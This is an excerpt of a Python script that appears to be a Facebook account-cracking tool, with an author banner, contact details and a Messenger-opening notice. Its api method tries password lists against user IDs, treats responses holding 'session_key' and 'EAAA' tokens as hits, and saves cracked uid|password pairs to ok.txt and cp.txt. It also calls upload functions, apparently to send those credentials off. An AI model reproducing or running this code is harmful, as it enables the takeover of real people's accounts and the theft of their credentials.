...
def notice():
	...
	runtxt("\033[0;92m ADMIN MESSENGER🔰𝐀𝐋𝐈𝐅\٠\__❷⓿❷❸ ;* 3:) :)")
	subprocess.check_output(["am", "start", "https://m.me/MYMENSINGH.ER.CEO.Imran.MAHMUD.2023"])
...
class Main:
 ...
 .----------------.  .----------------.  .----------------.  .----------------.  .-----------------.
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |     _____    | || | ____    ____ | || |  _______     | || |      __      | || | ____  _____  | |
| |    |_   _|   | || ||_   \  /   _|| || | |_   __ \    | || |     /  \     | || ||_   \|_   _| | |
| |      | |     | || |  |   \/   |  | || |   | |__) |   | || |    / /\ \    | || |  |   \ | |   | |
| |      | |     | || |  | |\  /| |  | || |   |  __ /    | || |   / ____ \   | || |  | |\ \| |   | |
...
\033[1;90m══════════════════════════════════════════════════
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFACEBOOK : 𝐀𝐋𝐈𝐅\٠\__❷⓿❷❸ ;* 3:) :)
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mFB GROUP : 🔴༒CuTe🦋ProFilE🦋PicTure BoY GriL🦋ID GIFT🦋CoMMunity༒🔴
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mGITHUB   : Imran
\033[1;91m [\033[1;94m✓\033[1;91m] \033[1;92mWhatsapp  : +8801989040589
\033[1;90m══════════════════════════════════════════════════
    """)
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Imran_OLD] : %s/%s -> \033[0;92m [ Imran-OK:%s ]- \033[0;91m[R140N-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[Imran-OK] %s|%s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write(" [Imran-OK] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;91m[Imran-CP] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Imran-CP] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
